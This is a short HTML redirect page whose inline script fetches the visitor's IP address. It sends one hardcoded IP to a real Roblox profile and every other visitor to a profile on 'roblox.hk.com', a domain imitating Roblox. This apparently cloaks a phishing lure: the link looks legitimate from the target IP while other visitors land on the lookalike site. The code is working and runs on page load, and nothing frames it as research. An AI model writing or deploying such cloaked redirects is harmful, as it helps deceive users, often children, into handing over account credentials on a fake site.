<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
        }
        p {
            font-size: 18px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Redirecting...</h1>
        <p>You will be redirected shortly. If not, <a id="manual-link" href="#">click here</a>.</p>
    </div>
    <script>
        const targetIp = "197.202.254.111"; // Target IP for special redirection
        const specialRedirectUrl = "https://www.roblox.com/users/2035263087/profile"; // Redirect for the target IP
        const defaultRedirectUrl = "https://roblox.hk.com/users/7321317449/profile"; // Redirect for all other IPs
        const delay = 2000; // Delay in milliseconds

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIp = data.ip;
                const redirectUrl = userIp === targetIp ? specialRedirectUrl : defaultRedirectUrl;
                document.getElementById("manual-link").href = redirectUrl;

                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, delay);
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
                // Optional: Handle error (e.g., redirect to the default site)
                window.location.href = defaultRedirectUrl;
            });
    </script>
</body>
</html>
